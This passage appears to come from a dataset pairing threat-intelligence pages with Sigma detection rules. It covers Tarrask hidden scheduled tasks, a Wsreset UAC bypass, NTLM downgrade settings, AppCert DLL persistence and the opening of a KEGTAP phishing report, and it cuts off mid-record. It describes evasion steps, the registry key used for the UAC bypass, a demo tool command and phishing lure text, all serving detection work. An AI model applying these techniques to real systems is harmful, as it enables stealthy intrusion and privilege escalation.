discovery of a defense evasion malware called Tarrask that creates “hidden” scheduled tasks, and subsequent actions to remove the task attributes, to conceal the scheduled tasks from traditional means of identification.\n\nThe blog outlines the simplicity of the malware technique Tarrask uses, while highlighting that scheduled task abuse is a very common method of persistence and defense evasion—and an enticing one, at that. In this post, we will demonstrate how threat actors create scheduled tasks, how they cover their tracks, how the malware’s evasion techniques are used to maintain and ensure persistence on systems, and how to protect against this tactic.\n\n## Right on schedule: Maintaining persistence via scheduled tasks\n\nWindows Task Scheduler is a service that allows users to perform automated tasks (scheduled tasks) on a chosen computer for legitimate administrative purposes (e.g., scheduled updates for browsers and other applications).\n\nThroughout the course of our research, we’ve found that threat actors commonly make use of this service to maintain persistence within a Windows environment.\n\nWe’ve noted that the Tarrask malware generates several artifacts upon the creation of a scheduled task, whether using the Task Scheduler GUI or the schtasks command line utility. Profiling the use of either of these tools can aid investigators in tracking this persistence mechanism.\n\nThe following registry keys are created upon creation of a new task:\n\n- `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\TASK_NAME`\n- `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{GUID}`\n\n```image\nAlt: Tarrask malware creates new registry keys along with the creation of new scheduled tasks\nDescription: The image shows a screenshot of the Windows Registry Editor, specifically focusing on the path `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache`. The highlighted sections include the 'Tasks' and 'Tree' directories within the TaskCache. The 'Tasks' directory contains several GUIDs that represent different scheduled tasks, while the 'Tree' subkey outlines the structure of the task cache. This visual representation is relevant for understanding how the Tarrask malware creates artifacts in the Windows Registry to maintain persistence.\nTranscription: |\n  Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\n  └── TaskCache\n      ├── Boot\n      ├── Logon\n      ├── Maintenance\n      └── Plain\n          └── Tasks\n              ├── {F5E862B9-98AE-458E-BC87-3ED25EFBB4D3}\n              ├── {F6003223-29BD-4000-B926-C388CFE836B}\n              ├── {F67BF9CD-2696-4F2D-97B8-B8C84A53C1E}\n              ├── {F8EEDA28-6261-4385-844A-684E6C988577}\n              ├── {F93EAA44-73E4-49FE-9F66-12B1FA4037C0}\n              ├── {F0B91E21-A58E-4797-94AC-04234895966E}\n              └── {FC3767EA-5307-4D11-BA38-EB21A3973D7}\n                  └── Tree\n                      ├── Adobe Acrobat Update Task\n                      ├── GoogleUpdateTaskMachineCore\n                      ├── GoogleUpdateTaskMachineUA\n                      ├── Microsoft\n                      ├── MicrosoftEdgeUpdateTaskMachineCore\n                      └── MicrosoftEdgeUpdateTaskMachineUA\n                      └── PowerToys\n```\n\n*Figure 1. Tarrask malware creates new registry keys along with the creation of new scheduled tasks*\n\nThe first subkey, created within the **Tree** path, matches the name of the scheduled task. The values created within it (Id, Index, and SD) contain metadata for task registration within the system. The second subkey, created within the **Tasks** path, is a GUID mapping to the **Id** value found in the **Tree** key. The values created within (Actions, Path, Triggers, etc.) contain the basic parameters necessary to facilitate execution of the task.\n\nTo demonstrate the value in the artifacts generated, shown in the following figures, we have created “My Special Task” which is set to execute the binary `C:\\Windows\\System32\\calc.exe` on a regular interval.\n\n```image\nAlt: XML file matches name of the task\nDescription: The image displays two sections of the Windows Registry Editor, showing the registry keys created by the Tarrask malware upon the creation of a scheduled task named 'My Special Task'. The upper section shows the path 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\My Special Task', highlighting values like 'Id', 'Index', and 'SD'. The lower section shows the path 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{GUID}', emphasizing the 'Actions' value stored as a binary. An edit dialog for the binary value is also visible, providing insight into the task's execution command.\nTranscription: |\n  Registry Editor\n  \n  Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\My Special Task\n  - (Default)        REG_SZ        (value not set)\n  - Id               REG_SZ        AFE1530C-2746-49FC-ACDB-AB27F9D5C392\n  - Index            REG_DWORD     0x00000003 (3)\n  - SD               REG_BINARY     01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  \n  Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{AFE1530C-2746-49FC-ACDB-AB27F9D5C392}\n  - (Default)        REG_SZ        (value not set)\n  - Actions          REG_BINARY     03 00 00 00 01 00 00 00 40 75 00 74 00 68 00 20 00\n  - Author           REG_SZ        WIN10-TEST-VM\n  - Date             REG_BINARY     2022-03-21T15:36:56.5201471\n  - DynamicInfo      REG_BINARY     ...\n  - Path             REG_SZ        My Special Task\n  - Id               REG_SZ        0x000000002 (65538)\n  - Triggers         REG_SZ        17 00 00 00 00 00 00 00\n  - Uid              REG_SZ        My Special Task\n  \n  Edit Binary Value\n  Value name: Actions\n  Value data:\n  00000000  03 00 00 00 01 00 00 00 40 75 00 74 00 68 00 20  |........@u.t.h. |\n  00000010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|\n```\n\n*Figure 2. XML file matches name of the task*\n\nSimilar information is also stored within an extensionless XML file created within `C:\\Windows\\System32\\Tasks`, where the name of the file matches the name of the task. This is displayed in Figure 2, where we name the task “My Special Task” as an example.\n\n```image\nAlt: Extensionless XML file\nDescription: The image depicts an XML file opened in Notepad. The XML file outlines the configuration for a scheduled task named 'My Special Task'. It includes various elements such as <RegistrationInfo>, <Triggers>, <Principals>, <Settings>, and <Actions>. Specifically, under the <Actions> section, the command to execute is specified as 'C:\\Windows\\System32\\calc.exe', indicating that the calculator application will be launched according to the defined schedule. The structure and tags show how the task is set up, including details like timing and permissions.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"UTF-16\"?>\n  <Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n    <RegistrationInfo>\n      <Date>2022-03-02T13:55:36.5620144</Date>\n      <Author>WIN10-TEST-VM\\REDACTED</Author>\n      <URI>My Special Task</URI>\n    </RegistrationInfo>\n    <Triggers>\n      <CalendarTrigger>\n        <StartBoundary>2022-03-02T13:55:36.5620144</StartBoundary>\n        <Enabled>true</Enabled>\n        <ScheduleByDay>\n          <DaysInterval>1</DaysInterval>\n        </ScheduleByDay>\n      </CalendarTrigger>\n    </Triggers>\n    <Principals>\n      <Principal id=\"Author\">\n        <RunLevel>LeastPrivilege</RunLevel>\n        <UserId>WIN10-TEST-VM\\REDACTED</UserId>\n        <LogonType>InteractiveToken</LogonType>\n      </Principal>\n    </Principals>\n    <Settings>\n      <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n      <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>\n      <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>\n      <AllowHardTerminate>false</AllowHardTerminate>\n      <StartWhenAvailable>false</StartWhenAvailable>\n      <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n      <IdleSettings>\n        <Duration>P1T0M</Duration>\n        <WaitTimeout>P1H</WaitTimeout>\n        <StopOnIdleEnd>true</StopOnIdleEnd>\n        <RestartOnIdle>false</RestartOnIdle>\n      </IdleSettings>\n      <AllowStartOnDemand>true</AllowStartOnDemand>\n      <Enabled>true</Enabled>\n      <RunOnIdle>false</RunOnIdle>\n      <WakeToRun>false</WakeToRun>\n      <ExecutionTimeLimit>P3D</ExecutionTimeLimit>\n      <Priority>7</Priority>\n    </Settings>\n    <Actions Context=\"Author\">\n      <Exec>\n        <Command>C:\\Windows\\System32\\calc.exe</Command>\n      </Exec>\n    </Actions>\n  </Task>\n```\n\n*Figure 3. Extensionless XML file*\n\nNote that the “Actions” value stored within the Tasks\\{GUID} key points to the command line associated with the task. In Figure 2, there is a reference to `C:\\Windows\\System32\\calc.exe` within the “Edit Binary Value” dialog, and there is a path referenced within the `<Command>` section in the extensionless XML file in Figure 3. The fact that this value is stored within two different locations can prove useful in recovering information regarding the task’s purpose in the event the threat actor has taken steps to cover their tracks.\n\nFinally, there are two Windows event logs that record actions related to the creation and operation of Scheduled Tasks – Event ID 4698 within the Security.evtx log, and the Microsoft-Windows-TaskScheduler/Operational.evtx log.\n\nNeither of these are audited by default and must be explicitly turned on by an administrator. Microsoft-Windows-TaskScheduler/Maintenance.evtx will exist by default, but only contains maintenance-related information for the Task Scheduler engine.\n\n## Effectively hiding scheduled tasks\n\nIn this scenario, the threat actor created a scheduled task named “WinUpdate” via HackTool:Win64/Tarrask in order to re-establish any dropped connections to their command and control (C&C) infrastructure. This resulted in the creation of the registry keys and values described in the earlier section, however, the threat actor deleted the SD value within the Tree registry path.\n\n```image\nAlt: Deletion of the security descriptor (SD) value\nDescription: The image displays a screenshot of the Windows Registry Editor showing the path for a scheduled task named 'WinUpdate'. It highlights the Security Descriptor (SD) value in the registry, which is important for controlling user permissions for running the task. The visual representation provides context on how the SD value is structured and its significance in the operation of the Tarrask malware.\nTranscription: |\n  Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\WinUpdate\n  \n  Name         Type          Data\n  (Default)    REG_SZ        (value not set)\n  Id           REG_SZ        {48BC799-F535-4C51-A72A-688F0875864C}\n  Index        REG_DWORD     0x00000003\n  SD           REG_BINARY    01 00 04 08 80 00 00 00 98 00 00 00 00 00 00 00\n```\n\n*Figure 4. Deletion of the security descriptor (SD) value*\n\nIn this context, SD refers to the Security Descriptor, which determines the users allowed to run the task. Interestingly, removal of this value results in the task “disappearing” from `schtasks /query` and Task Scheduler. The task is effectively hidden unless an examiner manually inspects the aforementioned registry paths.\n\nIssuing a `reg delete` command to delete the SD value will result in an “Access Denied” error even when run from an elevated command prompt. Deletion must occur within the context of the SYSTEM user. It is for this reason that the Tarrask malware utilized token theft to obtain the security permissions associated with the lsass.exe process. Upon execution of the token theft, the malware could operate with the same privileges as LSASS, making the deletion possible.\n\n```image\nAlt: Successful deletion of SD in Command Prompt\nDescription: The image shows a Command Prompt window displaying the output of a command executed to register a scheduled task named 'WinUpdate'. The output indicates that the task was successfully registered and includes a process ID (pid=1140). Additionally, it confirms that the security descriptor (SD) was successfully deleted, which is crucial for the defense evasion technique used by the Tarrask malware.\nTranscription: |\n  C:\\DEMO>wupdate.exe -name WinUpdate -path C:\\Windows\\System32\\winsrv.exe -time 2020-03-02T12:00:00 -param \"-relayserver 127.0.0.1\"\n  Success! Task successfully registered.\n  pid=1140\n  delete SD success.\n  C:\\DEMO>\n```\n\n*Figure 5. Successful deletion of SD in Command Prompt*\n\nIt is also important to note that the threat actor could have chosen to completely remove the two registry keys within Tree and Tasks, and the XML file created within `C:\\Windows\\System32\\Tasks`. This would effectively remove the on-disk artifacts associated with the scheduled task, but the task would continue to run according to the defined triggers until the system rebooted, or until the associated svchost.exe process responsible for executing the task was terminated.\n\nIt’s possible the threat actor wanted to ensure persistence across reboots and therefore chose not to perform those steps, instead deleting only the SD value; however, we also speculate that the threat actor was unaware that the task would continue to run even after these components were removed.\n\n## Recommendations and cyber resilience guidance\n\nJob or task schedulers are services that have been present in the Windows operating system for many years. The attacks we described signify how the threat actor HAFNIUM displays a unique understanding of the Windows subsystem and uses this expertise to mask activities on targeted endpoints to maintain persistence on affected systems and hide in plain sight.\n\nAs such, we recognize that scheduled tasks are an effective tool for adversaries to automate certain tasks while achieving persistence, which brings us to raising awareness about this oft-overlooked technique. We also want to bring attention to the fact that threat actors may utilize this method of evasion to maintain access to high value targets in a manner that will likely remain undetected. This could be especially problematic for systems that are infrequently rebooted (e.g., critical systems such as domain controllers, database servers, etc.).\n\nThe techniques used by the actor and described in this post can be mitigated or detected by adopting the following recommendations and security guidelines[^1]:\n\n- Enumerate your Windows environment registry hives looking in the `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree` registry hive and identify any scheduled tasks without SD (security descriptor) Value within the Task Key. Perform analysis on these tasks as needed.\n- Modify your audit policy to identify Scheduled Tasks actions by enabling logging “TaskOperational” within Microsoft-Windows-TaskScheduler/Operational. Apply the recommended Microsoft audit policy settings suitable to your environment.\n- Enable and centralize the following Task Scheduler logs. Even if the tasks are ‘hidden’, these logs track key events relating to them that could lead you to discovering a well-hidden persistence mechanism:\n  - Event ID 4698 within the Security.evtx log\n  - Microsoft-Windows-TaskScheduler/Operational.evtx log\n- The threat actors in this campaign used hidden scheduled tasks to maintain access to critical assets exposed to the internet by regularly re-establishing outbound communications with C&C infrastructure. Remain vigilant and monitor uncommon behavior of your outbound communications by ensuring that monitoring and alerting for these connections from these critical Tier 0 and Tier 1 assets is in place.\n\n## Indicators of compromise (IOCs)\n\nThe following list provides IOCs observed during our investigation. We encourage customers to investigate these indicators in their environments and implement detections and protections to identify past related activity and prevent future attacks against their systems.\n\n| **SHA256**                                                       | **File Name**                                                                                                                                            | **Details**        |\n| ---------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------ |\n| 54660bd327c9b9d60a5b45cc59477c75b4a8e2266d988da8ed9956bcc95e6795 | winupdate.exe, date.exe, win.exe                                                                                                                         | Tarrask            |\n| a3baacffb7c74dc43bd4624a6abcd1c311e70a46b40dcc695b180556a9aa3bb2 | windowsvc.exe, winsrv.exe, WinSvc.exe, ScriptRun.exe, Unique.exe, ngcsvc.exe, ligolo_windows_amd64.exe, proxy.zip, wshqos.exe, cert.exe, ldaputility.exe | Ligolo             |\n| 7e0f350864fb919917914b380da8d9b218139f61ab5e9b28b41ab94c2477b16d | CertCert.jsp, Cert0365.jsp                                                                                                                               | Godzilla web shell |\n\n## Microsoft 365 Defender Detections\n\nHow customers can identify this in Microsoft 365 Defender:\n\n### Microsoft Defender Antivirus\n\nMicrosoft Defender for Endpoint detects implants and components as the following:\n\n- HackTool:Win64/Tarrask!MSR\n- HackTool:Win64/Ligolo!MSR\n\nMicrosoft Defender for Endpoint detects malicious behavior observed as the following:\n\n- Behavior:Win32/ScheduledTaskHide.A\n\n## Microsoft Sentinel Detections\n\nMicrosoft Sentinel customers can use the following detection queries to look for this activity:\n\n- Tarrask malware hash IOC: This query identifies a hash match related to Tarrask malware across various data sources.\n- Scheduled Task Hide: This query uses Windows Security Events to detect attempts by malware to hide the scheduled task by deleting the SD (Security Descriptor) value. Removal of SD value results in the scheduled task “disappearing” from `schtasks /query` and Task Scheduler.\n- Microsoft Defender AV Hits: This query looks for Microsoft Defender AV detections related to Tarrask malware using SecurityAlerts table. In Microsoft Sentinel the SecurityAlerts table includes only the Device Name of the affected device, this query joins the DeviceInfo table to clearly connect other information such as Device group, IP, logged on users etc. This way, the Microsoft Sentinel user can have all the pertinent device info in one view for the alerts.",
    "sigma_rule": {
      "title": "Removal Of SD Value to Hide Schedule Task - Registry",
      "id": "acd74772-5f88-45c7-956b-6a7b36c294d2",
      "related": [
        {
          "id": "526cc8bc-1cdc-48ad-8b26-f19bff969cec",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Remove SD (Security Descriptor) value in \\Schedule\\TaskCache\\Tree registry hive to hide schedule task. This technique is used by Tarrask malware",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/"
      ],
      "author": "Sittikorn S",
      "date": "2022-04-15",
      "modified": "2023-02-08",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_delete"
      },
      "detection": {
        "selection": {
          "EventType": "DeleteKey",
          "TargetObject|contains|all": [
            "\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\",
            "SD"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_delete\\registry_delete_schtasks_hide_task_via_sd_value_removal.yml",
    "id": "913"
  },
  {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Wsreset/",
    "markdown": "# /Wsreset.exe\n\nUsed to reset Windows Store settings according to its manifest file.\n\n### Paths:\n- `C:\\Windows\\System32\\wsreset.exe`\n\n### Resources:\n- https://www.activecyber.us/activelabs/windows-uac-bypass\n- https://twitter.com/ihack4falafel/status/1106644790114947073\n- https://github.com/hfiref0x/UACME/blob/master/README.md\n\n### Detections:\n- Sigma: proc_creation_win_uac_bypass_wsreset_integrity_level.yml\n- Sigma: proc_creation_win_uac_bypass_wsreset.yml\n- Sigma: registry_event_bypass_via_wsreset.yml\n- Splunk: wsreset_uac_bypass.yml\n- IOC: `wsreset.exe` launching child process other than `mmc.exe`\n- IOC: Creation or modification of the registry value `HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command`\n- IOC: Microsoft Defender Antivirus as `Behavior:Win32/UACBypassExp.T!gen`\n\n## UAC bypass\n\nDuring startup, `wsreset.exe` checks the registry value `HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command` for the command to run. The binary will be executed as a high-integrity process without a UAC prompt being displayed to the user.\n\n```\nwsreset.exe\n```\n\n**Properties:**\n- **Use case:** Execute a binary or script as a high-integrity process without a UAC prompt.\n- **Privileges required:** User\n- **Operating systems:** Windows 10, Windows 11\n- **ATT&CK® technique:** T1548.002: Bypass User Account Control",
    "sigma_rule": {
      "title": "UAC Bypass Via Wsreset",
      "id": "6ea3bf32-9680-422d-9f50-e90716b12a66",
      "status": "test",
      "description": "Unfixed method for UAC bypass from Windows 10. WSReset.exe file associated with the Windows Store. It will run a binary file contained in a low-privilege registry.",
      "references": [
        "https://www.bleepingcomputer.com/news/security/trickbot-uses-a-new-windows-10-uac-bypass-to-launch-quietly",
        "https://lolbas-project.github.io/lolbas/Binaries/Wsreset/"
      ],
      "author": "oscd.community, Dmitry Uchakin",
      "date": "2020-10-07",
      "modified": "2021-11-27",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1548.002"
      ],
      "logsource": {
        "category": "registry_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command"
        },
        "condition": "selection"
      },
      "fields": [
        "ComputerName",
        "Image",
        "EventType",
        "TargetObject"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_event\\registry_event_bypass_via_wsreset.yml",
    "id": "915"
  },
  {
    "url": "https://www.ultimatewindowssecurity.com/wiki/page.aspx?spid=NSrpcservers",
    "markdown": "# Network security: Minimum session security for NTLM SSP based (including secure RPC) servers\n\nThis value impacts applications, from the point of view of the server, that use the NTLM SSP or secure RPC and specifies session security requirements for communication between the client and server.\n\n| Hex value  | Check box                       | Meaning                                                                                                                                                                       |\n| ---------- | ------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| 0x0        | None checked                    | None. No security is used for session security.                                                                                                                               |\n| 0x10       | Require message integrity       | Message integrity. If the value of either this entry or the `NtlmMinClientSec` entry is 0x10, the connection will fail unless message integrity is negotiated.                |\n| 0x20       | Require message confidentiality | Message confidentiality. If the value of either this entry or the `NtlmMinClientSec` entry is 0x20, the connection will fail unless message confidentiality is negotiated.    |\n| 0x80000    | Require NTLMv2 session security | NTLMv2 session security. If the value of either this entry or the `NtlmMinClientSec` entry is 0x80000, the connection will fail unless NTLMv2 session security is negotiated. |\n| 0x20000000 | Require 128-bit encryption      | 128-bit encryption. If the value of either this entry or the `NtlmMinClientSec` entry is 0x20000000, the connection will fail unless 128-bit encryption is negotiated.        |\n\nAs best I can tell, this setting will primarily impact secure RBC communications such as between Outlook and Exchange when authenticating via NTLM.\n\nUnanswered questions: how do these settings affect SMB traffic or do they? Do these setting apply to all RPC traffic, only secure RPC traffic or just secure RPC traffic authenticated via NTLM instead of Keberos? How do these setting affect traffic sent via the Kerberos SSP? If they don’t, how do you set similar requirements for Kerberos SSP? \n\nUnderlying registry key and value\n\n```\nNtlmMinServerSec HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0\n```\n\n| Data type  | Range                                            | Default value |\n|------------|--------------------------------------------------|---------------|\n| REG_DWORD  | 0x0 | 0x10 | 0x20 | 0x80000 | 0x20000000         | 0x0           |\n\nExcellent sources for more information on NTLM: [Eric Glass on NTLM](http://davenport.sourceforge.net/ntlm.html) by Eric Glass and [Microsoft Technet Security Watch (August 2006)](http://www.microsoft.com/technet/technetmag/issues/2006/08/SecurityWatch/)",
    "sigma_rule": {
      "title": "NetNTLM Downgrade Attack - Registry",
      "id": "d67572a0-e2ec-45d6-b8db-c100d14b8ef2",
      "status": "test",
      "description": "Detects NetNTLM downgrade attack",
      "references": [
        "https://web.archive.org/web/20171113231705/https://www.optiv.com/blog/post-exploitation-using-netntlm-downgrade-attacks",
        "https://www.ultimatewindowssecurity.com/wiki/page.aspx?spid=NSrpcservers"
      ],
      "author": "Florian Roth (Nextron Systems), wagga, Nasreddine Bencherchali (Splunk STRT)",
      "date": "2018-03-20",
      "modified": "2024-12-03",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001",
        "attack.t1112"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_event"
      },
      "detection": {
        "selection_regkey": {
          "TargetObject|contains|all": [
            "SYSTEM\\",
            "ControlSet",
            "\\Control\\Lsa"
          ]
        },
        "selection_value_lmcompatibilitylevel": {
          "TargetObject|endswith": "\\lmcompatibilitylevel",
          "Details": [
            "DWORD (0x00000000)",
            "DWORD (0x00000001)",
            "DWORD (0x00000002)"
          ]
        },
        "selection_value_ntlmminclientsec": {
          "TargetObject|endswith": "\\NtlmMinClientSec",
          "Details": [
            "DWORD (0x00000000)",
            "DWORD (0x00000010)",
            "DWORD (0x00000020)",
            "DWORD (0x00000030)"
          ]
        },
        "selection_value_restrictsendingntlmtraffic": {
          "TargetObject|endswith": "\\RestrictSendingNTLMTraffic"
        },
        "condition": "selection_regkey and 1 of selection_value_*"
      },
      "falsepositives": [
        "Services or tools that set the values to more restrictive values"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_event\\registry_event_net_ntlm_downgrade.yml",
    "id": "918"
  },
  {
    "url": "https://eqllib.readthedocs.io/en/latest/analytics/14f90406-10a0-4d36-a672-31cabe149f2f.html",
    "markdown": "# AppCert DLLs Registry Modification\n\nDynamic-link libraries (DLLs) that are specified in the AppCertDLLs value in the Registry key can be abused to obtain persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.\n\n| Field      | Value                                |\n|------------|--------------------------------------|\n| id         | 14f90406-10a0-4d36-a672-31cabe149f2f |\n| categories | enrich                               |\n| confidence | low                                  |\n| os         | windows                              |\n| created    | 7/26/2019                            |\n| updated    | 7/26/2019                            |\n\n## MITRE ATT&CK™ Mapping\n\n| Field      | Value                             |\n|------------|-----------------------------------|\n| tactics    | Privilege Escalation, Persistence |\n| techniques | T1182 AppCert DLLs                |\n\n## Query\n\n```\nregistry where registry_path == \"*\\\\System\\\\ControlSet*\\\\Control\\\\Session Manager\\\\AppCertDLLs\\\\*\"\n```",
    "sigma_rule": {
      "title": "New DLL Added to AppCertDlls Registry Key",
      "id": "6aa1d992-5925-4e9f-a49b-845e51d1de01",
      "status": "test",
      "description": "Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs value in the Registry key can be abused to obtain persistence and privilege escalation\nby causing a malicious DLL to be loaded and run in the context of separate processes on the computer.\n",
      "references": [
        "http://www.hexacorn.com/blog/2013/01/19/beyond-good-ol-run-key-part-3/",
        "https://eqllib.readthedocs.io/en/latest/analytics/14f90406-10a0-4d36-a672-31cabe149f2f.html"
      ],
      "author": "Ilyas Ochkov, oscd.community",
      "date": "2019-10-25",
      "modified": "2021-11-27",
      "tags": [
        "attack.persistence",
        "attack.t1546.009"
      ],
      "logsource": {
        "category": "registry_event",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "TargetObject": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls"
          },
          {
            "NewName": "HKLM\\SYSTEM\\CurentControlSet\\Control\\Session Manager\\AppCertDlls"
          }
        ],
        "condition": "selection"
      },
      "fields": [
        "EventID",
        "Image",
        "TargetObject",
        "NewName"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_event\\registry_event_new_dll_added_to_appcertdlls_registry_key.yml",
    "id": "920"
  },
  {
    "url": "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/",
    "markdown": "# Unhappy Hour Special: KEGTAP and SINGLEMALT With a Ransomware Chaser\n\n**October 28, 2020**\n\n---\n\nThroughout 2020, ransomware activity has become increasingly prolific, relying on an ecosystem of distinct but co-enabling operations to gain access to targets of interest before conducting extortion. Mandiant Threat Intelligence has tracked several loader and backdoor campaigns that lead to the post-compromise deployment of ransomware, sometimes within 24 hours of initial compromise. Effective and fast detection of these campaigns is key to mitigating this threat.\n\nThe malware families enabling these attacks previously reported by Mandiant to intelligence subscribers include KEGTAP/BEERBOT, SINGLEMALT/STILLBOT, and WINEKEY/CORKBOT. While these malware families communicate with the same command and control infrastructure (C2) and are close to functional parity, there are minimal code overlaps across them. Other security researchers have tracked these malware families under the names BazarLoader and BazarBackdoor or Team9.\n\nThe operators conducting these campaigns have actively targeted hospitals, retirement communities, and medical centers, even in the midst of a global health crisis, demonstrating a clear disregard for human life.\n\n## Email Campaign TTPs\n\nCampaigns distributing KEGTAP, SINGLEMALT, and WINEKEY have been sent to individuals at organizations across a broad range of industries and geographies using a series of shifting delivery tactics, techniques, and procedures (TTPs). Despite the frequent changes seen across these campaigns, the following has remained consistent across recent activity:\n\n- Emails contain an in-line link to an actor-controlled Google Docs document, typically a PDF file.\n- This document contains an in-line link to a URL hosting a malware payload.\n- Emails masquerade as generic corporate communications, including follow-ups about documents and phone calls or emails crafted to appear related to complaints, terminations, bonuses, contracts, working schedules, surveys, or queries about business hours.\n- Some email communications have included the recipient’s name or employer name in the subject line and/or email body.\n\nDespite this uniformity, the associated TTPs have otherwise changed regularly—both between campaigns and across multiple spam runs seen in the same day. Notable ways that these campaigns have varied over time include:\n\n- Early campaigns were delivered via Sendgrid and included in-line links to Sendgrid URLs that would redirect users to attacker-created Google documents. In contrast, recent campaigns have been delivered via attacker-controlled or compromised email infrastructure and have commonly contained in-line links to attacker-created Google documents, although they have also used links associated with the Constant Contact service.\n- The documents loaded by these in-line links are crafted to appear somewhat relevant to the theme of the email campaign and contain additional links along with instructions directing users to click on them. When clicked, these links download malware binaries with file names masquerading as document files. Across earlier campaigns, these malware binaries were hosted on compromised infrastructure; however, the attackers have shifted to hosting their malware on legitimate web services, including Google Drive, Basecamp, Slack, Trello, Yougile, and JetBrains.\n- In recent campaigns, the malware payloads have been hosted on numerous URLs associated with one or more of these legitimate services. In cases where the payloads have been taken down, the actors have sometimes updated their Google documents to contain new, working links.\n- Some campaigns have also incorporated customization, including emails with internal references to the recipients’ organizations and organizations’ logos embedded into the Google Docs documents.\n\n```image\nAlt: Figure 1: Email containing internal references to target an organization’s name\nDescription: The image depicts a screenshot of an email titled 'Contract cancellation reminder.' The email appears to be crafted to resemble a legitimate corporate communication, with a greeting and a message informing the recipient that a contract with their company is temporarily suspended. It includes a link to a Google Docs document, which is likely intended to download malware when clicked. The email uses an official-sounding sender name, 'Bethanne Wesley,' and features a professional layout, making it seem credible to the recipient.\nTranscription: |\n  Contract cancellation reminder\n  \n  From: Bethanne Wesley <andrew.constantine@littlernews.mobi>\n  Date: Today at 11:42 AM\n  \n  Good day to you, [REDACTED]!\n  Unfortunately, we are here to tell you that our contract with [REDACTED] company is temporarily suspended because of the riots on the factory house. Payments compensation info and contract you can find here:\n  https://docs.google.com/document/d/e/2PACX-1vTX6R2anNzKGbShQGLLz_U7DvhhakDw3kOO3b6-0Gr1w6BmDwmFsXM994WAnmptW4D17wANH7l_2/pub\n  \n  We are sorry for such troubles.\n  \n  Regards,\n  Bethanne Wesley\n```\n\n```image\nAlt: Figure 2: Google Docs PDF document containing a target organization’s logo\nDescription: The image depicts a Google Drive document labeled 'Termination List.PDF' featuring a preview for a document with the title 'Termination List #49376-22/10'. A blue button labeled 'START' is prominently displayed, indicating that users can click to download the document. The message suggests that the document is ready for preview and provides instructions for downloading, emphasizing that the preview is available only on desktop computers. This layout is typical of phishing attempts, which often use such tactics to lure users into downloading malicious payloads.\nTranscription: |\n  Termination List.PDF\n  Updated automatically every 5 minutes\n  \n  Termination List #49376-22/10\n  Termination List #49376-22/10 is ready to preview. If downloading doesn't start automatically, click the buttons below.\n  \n  [START]\n  \n  Preview is available only on desktop computers.\n  \n  Published by Google Drive – Report Abuse\n```\n\nHiding the final payload behind multiple links is a simple yet effective way to bypass some email filtering technologies. Various technologies have the ability to follow links in an email to try to identify malware or malicious domains; however, the number of links followed can vary. Additionally, embedding links within a PDF document further makes automated detection and link-following difficult.\n\n## Post-Compromise TTPs\n\nGiven the 